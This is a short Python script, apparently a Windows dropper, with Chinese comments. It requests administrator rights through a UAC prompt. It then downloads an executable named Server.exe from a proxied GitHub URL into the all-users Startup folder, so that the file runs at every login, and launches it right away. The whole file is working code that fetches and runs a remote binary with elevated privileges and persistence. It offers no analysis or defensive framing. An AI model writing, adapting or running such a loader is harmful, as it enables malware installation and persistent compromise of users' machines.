import urllib.request
import os
import time
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():  
    url = "https://ghproxy.org/https://raw.githubusercontent.com/snow6BIG/gpt-/main/Server.exe"#下载地址
    dir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"#保存位置
    file_path = os.path.join(dir, 'Server.exe')#保存为

    # 下载文件
    urllib.request.urlretrieve(url, file_path)
    
    # 检查文件是否下载完成
    if os.path.exists(file_path):
        print('File downloaded successfully.')
        print('Launching the file in 5 seconds...')
        time.sleep(5)
        os.startfile(file_path)
    else:
        print('Failed to download the file.')
else:
    if sys.version_info[0] == 3:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)
